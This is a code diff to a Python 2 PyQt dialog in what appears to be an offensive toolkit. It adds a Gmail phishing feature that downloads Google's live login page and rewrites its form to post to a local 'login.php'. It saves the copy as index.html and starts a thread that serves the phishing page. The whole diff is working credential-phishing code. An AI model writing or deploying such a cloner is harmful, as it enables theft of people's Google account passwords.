@@ -302,6 +302,7 @@ class frm_template(QDialog):
         self.Main = QVBoxLayout(self)
         self.setGeometry(0, 0, 254, 100)
         self.center()
+        self.control = None
         self.owd = getcwd()
         sshFile="Core/dark_style.css"
         with open(sshFile,"r") as fh:
@@ -350,13 +351,19 @@ class frm_template(QDialog):
                     return None
         elif self.check_gmail.isChecked():
             sock = None
+            try:
+                request = urlopen('http://accounts.google.com/Login?hl').read()
+                self.control = 1
+            except URLError,e:
+                QMessageBox.information(self,"Error","Server not found, can't find the server at google. " + str(e))
         elif self.check_route.isChecked():
             sock = 1
         else:
             sock = 3
-        self.thread_page = threading.Thread(target=self.phishing_page,args=(sock,))
-        self.thread_page.daemon = True
-        self.thread_page.start()
+        if self.control != None:
+            self.thread_page = threading.Thread(target=self.phishing_page,args=(sock,))
+            self.thread_page.daemon = True
+            self.thread_page.start()
 
     def phishing_page(self,sock):
             type_phishing = None
@@ -380,6 +387,12 @@ class frm_template(QDialog):
                 path = "Module/Phishing/Gmail/"
                 try:
                     chdir(path)
+                    request = urlopen('http://accounts.google.com/Login?hl').read()
+                    request = request.replace("//ssl.gstatic.com/accounts/ui/","")
+                    request = request.replace("https://accounts.google.com/ServiceLoginAuth","login.php")
+                    google_page = open("index.html", "w")
+                    google_page.write(request)
+                    google_page.close()
                 except OSError,e:
                     return None
                 type_phishing = "Gmail"
